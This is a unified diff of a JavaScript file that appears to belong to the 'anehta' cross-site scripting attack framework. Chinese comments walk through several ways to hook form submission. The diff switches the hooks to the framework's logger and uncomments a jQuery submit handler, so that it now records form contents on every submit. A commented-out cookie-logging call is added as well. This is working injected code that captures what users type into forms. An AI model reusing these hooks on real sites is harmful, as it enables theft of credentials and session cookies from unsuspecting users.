@@ -10,7 +10,7 @@
 ////////////////////////////////////////////////////////////////
 /*
 $("form").bind("submit", 
-               function(){logForm($("form")[0], logurl, 500);}
+               function(){ anehta.logger.logForm($("form")[0]); }
                );
 */
 
@@ -19,13 +19,14 @@ $("form").bind("submit",
 // 第二种hook submit方法
 // JQuery 直接的hook submit 方法
 ///////////////////////////////////////////////////////////////
-/*
+
 $("form").eq(0).submit(function(){
-	                logForm($("form")[0], logurl, 500);
+	                anehta.logger.logForm($("form")[0]);
+	                //anehta.logger.logCookie();
 	                //return true;
 	              }
 	              );
-*/
+
 ////////////////////////////////////////////////////////////////
 // 第三种hook submit 方法
 // 如果是在javascript函数里调用了表单的比如: form.submit();
@@ -38,17 +39,20 @@ $("form").eq(0).submit(function(){
 function injectSubmitFunc(o, param){
 	// your code here!
 	alert(param);
+	anehta.logger.logForm($("form")[0]);
+	
 	
 	// 最后记得恢复表单的正常提交
 	if (o._submit != undefined) {
 				o._submit(); // 被hook过了
 			} else {
 				o.submit();
-			} 
+			}
+			 
 }
-*/
-//hookSubmit($("form")[0], function (){injectSubmitFunc($("form")[0], "fvck");});
 
+anehta.hooklib.hookSubmit($("form")[0], function (){injectSubmitFunc($("form")[0], "fvck");});
+*/
 
 ///////////////////////////////////////////////////////////////
 // hook 一般函数的方法
@@ -58,14 +62,14 @@ function injectSubmitFunc(o, param){
 // hj.hook("被hook的函数名", "保存原函数的变量", "你的函数名");
 // hi.unhook("被hook的函数名", "保存原函数的变量");
 ///////////////////////////////////////////////////////////////
+/*
 // 自定义函数1
 function test(a, b){
-	//logForm($("form")[0], logurl, 500);
 	alert("test");
 	_a=a+b;
 	_b=b;
 	//alert("_a,_b= "+_a+""+_b);
-	
+	anehta.logger.logForm($("form")[0]);
 	var ret = new Array(_a, _b);
 	//alert(ret);
 	return ret;
@@ -90,7 +94,7 @@ hj.injectFn("test","_test", "test2");
 
 
 //setTimeout(function(){function1(); hj.unhook("test","_test");},6000);
-
+*/
 
 
 //////////////////////////////////////////////////////////////
